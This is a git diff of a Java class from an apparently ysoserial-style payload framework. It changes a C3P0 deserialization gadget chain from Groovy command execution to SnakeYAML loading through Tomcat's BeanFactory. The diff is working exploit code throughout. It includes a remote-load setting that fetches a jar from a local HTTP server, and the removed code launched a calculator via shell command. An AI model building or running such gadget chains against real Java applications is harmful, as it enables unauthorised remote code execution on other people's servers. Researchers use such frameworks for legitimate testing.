@@ -7,7 +7,6 @@ import com.ppp.annotation.Dependencies;
 import com.ppp.secmgr.PayloadRunner;
 import com.ppp.sinks.SinkScheduler;
 import com.ppp.sinks.SinksHelper;
-import com.ppp.sinks.annotation.EnchantEnums;
 import com.ppp.sinks.annotation.EnchantType;
 import com.ppp.sinks.annotation.Sink;
 import com.ppp.utils.RanDomUtils;
@@ -26,62 +25,60 @@ import java.sql.SQLFeatureNotSupportedException;
 import java.util.logging.Logger;
 
 /**
- * Groovy
+ * SnakeYaml
  */
-@Dependencies({"com.mchange:c3p0:0.9.5.2", "com.mchange:mchange-commons-java:0.2.11", "org.apache:tomcat:8.5.35", "org.codehaus.groovy:groovy:2.3.9"})
+@Dependencies({"com.mchange:c3p0:0.9.5.2", "com.mchange:mchange-commons-java:0.2.11", "org.apache:tomcat:8.5.35", "org.yaml:snakeyaml:<=1.33"})
 @Sink({Sink.C3P0})
-public class C3P0_3 implements ObjectPayload<Object> {
+public class C3P0_Yaml implements ObjectPayload<Object> {
 
     public static void main(String[] args) throws Exception {
 //        PayloadRunner.run(C3P0.class, args);
 
         // rce
         SinksHelper sinksHelper = new SinksHelper();
-        sinksHelper.setSink(C3P0_3.class.getAnnotation(Sink.class).value()[0]);
-        sinksHelper.setEnchant(EnchantType.Command);
-        sinksHelper.setCommandType(EnchantEnums.Default);
-        sinksHelper.setCommand("open -a Calculator.app");
+        sinksHelper.setSink(C3P0_Yaml.class.getAnnotation(Sink.class).value()[0]);
+        sinksHelper.setEnchant(EnchantType.RemoteLoad);
+        sinksHelper.setUrl("http://127.0.0.1:1234/SnakeyamlDemo-1.0.jar");
         JavaClassHelper javaClassHelper = new JavaClassHelper();
         sinksHelper.setJavaClassHelper(javaClassHelper);
-        PayloadRunner.run(C3P0_3.class, args, sinksHelper);
+        PayloadRunner.run(C3P0_Yaml.class, args, sinksHelper);
     }
 
     public Object getObject(SinksHelper sinksHelper) throws Exception {
         // sink
         Object sinkObject = SinkScheduler.builder(sinksHelper);
-        System.out.println(sinkObject);
 
         Object kickOffObject = getChain(sinkObject.toString());
 
         return kickOffObject;
     }
 
-    public Object getChain(String script) throws Exception {
+    public Object getChain(String yaml) throws Exception {
 //        PoolBackedDataSource b = Reflections.createWithoutConstructor(PoolBackedDataSource.class);
 //        Reflections.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource(className, url));
         /**
          * Ref: https://github.com/frohoff/ysoserial/pull/184
          */
         PoolBackedDataSourceBase b = Reflections.createWithoutConstructor(PoolBackedDataSourceBase.class);
-        Reflections.setFieldValue(b, "connectionPoolDataSource", new PoolSource(script));
+        Reflections.setFieldValue(b, "connectionPoolDataSource", new PoolSource(yaml));
 
         return b;
     }
 
     private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {
 
-        private String command;
+        private String yaml;
 
-        public PoolSource(String command) {
-            this.command = command;
+        public PoolSource(String yaml) {
+            this.yaml = yaml;
         }
 
         public Reference getReference() throws NamingException {
             String s = RanDomUtils.generateRandomString(3);
-            ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
-            ref.add(new StringRefAddr("forceString", s + "=evaluate"));
-
-            ref.add(new StringRefAddr(s, String.format("'%s'.execute()", command)));
+            ResourceRef ref = new ResourceRef("org.yaml.snakeyaml.Yaml", null, "", "",
+                    true, "org.apache.naming.factory.BeanFactory", null);
+            ref.add(new StringRefAddr("forceString", s+"=load"));
+            ref.add(new StringRefAddr(s, yaml));
             return ref;
         }
 
